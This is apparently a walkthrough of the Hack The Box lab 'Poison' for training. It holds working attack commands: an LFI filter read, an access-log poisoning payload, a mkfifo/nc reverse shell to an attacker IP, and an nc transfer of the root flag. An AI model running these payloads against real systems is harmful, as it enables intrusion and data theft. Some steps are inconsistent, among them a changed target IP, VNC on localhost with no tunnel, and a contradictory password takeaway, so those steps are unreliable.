# HTB: Poison

## Machine Information
- **Name:** Poison
- **OS:** FreeBSD
- **Difficulty:** Medium
- **IP:** 10.129.1.254

## Reconnaissance

### Nmap Scan
```bash
nmap -sCV -T4 10.129.1.254 -oA nmap/nmap
```

**Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-title: Site doesn't have a title
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```

## Initial Access - LFI Vulnerability

### Discovering LFI
The web application at `http://10.129.1.254/browse.php?file=browse.php` revealed a Local File Inclusion vulnerability. Attempting to include the file directly showed:

```
Fatal error: Allowed memory size of 134217728 bytes exhausted
```

### Reading Source Code via PHP Filter
Using PHP's filter wrapper, we could read source code in base64:

```bash
curl -s "http://10.129.1.254/browse.php?file=php://filter/convert.base64-encode/resource=browse.php" | base64 -d
```

**Output:**
```php
<?php
include($_GET['file']);
?>
```

This confirmed a direct LFI with no filtering.

### Discovering Web Files
Reading `index.php` revealed available scripts:
```bash
curl -s "http://10.129.1.254/browse.php?file=php://filter/convert.base64-encode/resource=index.php" | base64 -d
```

Found scripts: `ini.php`, `info.php`, `listfiles.php`, `phpinfo.php`

### Reading PHP Info
```bash
curl "http://10.129.1.254/phpinfo.php" | grep -E "(disable_functions|open_basedir|allow_url_fopen|allow_url_include)"
```

**Key Findings:**
- `allow_url_fopen = On`
- `allow_url_include = Off`
- `disable_functions = no value`
- `open_basedir = no value`

## Log Poisoning - Getting Shell

### Finding Log File Location
To locate log files, we read the Apache configuration:

```bash
curl -s "http://10.129.1.254/browse.php?file=/usr/local/etc/apache24/httpd.conf"
```

**Found:**
```
ErrorLog "/var/log/httpd-error.log"
CustomLog "/var/log/httpd-access.log" combined
```

### Poisoning the Access Log
We poisoned the Apache access log by sending a request with a malicious User-Agent containing PHP code:

```bash
curl -A "<?php system($_GET['c']); ?>" http://10.129.1.254/
```

### Exploiting the Poisoned Log
The poisoned log was then included and executed:

```bash
curl "http://10.129.1.254/browse.php?file=/var/log/httpd-access.log&c=id"
```

This returned:
```
uid=80(www) gid=80(www) groups=80(www)
```

### Getting a Reverse Shell
A reverse shell was established using:

```bash
curl "http://10.129.1.254/browse.php?file=/var/log/httpd-access.log&c=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E%261|nc%2010.10.15.146%204444%20%3E/tmp/f"
```

Listener on Kali:
```bash
nc -lvnp 4444
```

## Privilege Escalation - Getting User

### Reading Password Backup
From the `www` shell, we explored the system and found `listfiles.php` revealing files in the web directory:

```bash
curl "http://10.129.1.254/listfiles.php"
```

**Found:**
```
pwdbackup.txt
```

### Decoding the Password
`pwdbackup.txt` contained a password encoded in base64 13 times:

```bash
cat pwdbackup.txt
```

**Output:**
```
This password is secure, it's encoded atleast 13 times.. what could go wrong really..
[base64 encoded text]
```

Decoding 13 times yielded the password:
```
Charix!2#4%6&8(0
```

Decoding script:
```bash
for i in {1..13}; do
    base64 -d encoded.txt > decoded.txt
    mv decoded.txt encoded.txt
done
```

### SSH Access as Charix
Using the decoded password, we gained SSH access:

```bash
ssh charix@10.129.47.247
# Password: Charix!2#4%6&8(0
```

**User flag found:**
```bash
charix@Poison:~ % cat user.txt
e<snip>c
```

## Privilege Escalation - Getting Root

### Finding VNC Service
As user `charix`, we checked running processes and found VNC:

```bash
charix@Poison:~ % netstat -an -p tcp
```
```
tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
```

```bash
charix@Poison:~ % ps aux | grep root
```
Found:
```
root   614  0.0  0.9  23620  8868 v0- I    11:42    0:00.03 Xvnc :1 -desktop X
```

### Finding VNC Password
The home directory contained:

```bash
charix@Poison:~ % ls
secret          secret.zip      user.txt
```

The `secret.zip` file was encrypted with the same password we found earlier:
```bash
charix@Poison:~ % scp secret.zip kali@10.10.15.146:/home/kali/
```

On Kali:
```bash
unzip secret.zip
# Password: Charix!2#4%6&8(0
# Extracted: secret file
```

### Accessing VNC
Using the extracted `secret` file as VNC password:

```bash
vncviewer localhost:5901 -passwd secret
```

This connected to root's VNC session, providing a desktop environment with root privileges.

### Finding the Root Flag
From the VNC session:

```bash
root@Poison:~# cat root.txt
7<snip>5
```

### Transferring the Flag
The flag was transferred to Kali using netcat:

**On Kali (listener):**
```bash
nc -lvnp 4444 > flag.txt
```

**In VNC session (as root):**
```bash
cat /root/root.txt | nc 10.10.15.146 4444
```

## Key Takeaways

1. **LFI vulnerabilities** can be exploited with PHP wrappers to read source code
2. **Log poisoning** is an effective technique when RFI is disabled
3. **Multiple base64 encodings** don't provide security
4. **Password reuse** (VNC password = user password) allowed easy privilege escalation
5. **FreeBSD systems** have slightly different file paths than Linux
6. **VNC services** running as root can be a privilege escalation vector

## Tools Used

- Nmap
- Curl
- Base64
- SSH
- SCP
- Netcat
- VNC Viewer
- Python (for decoding)
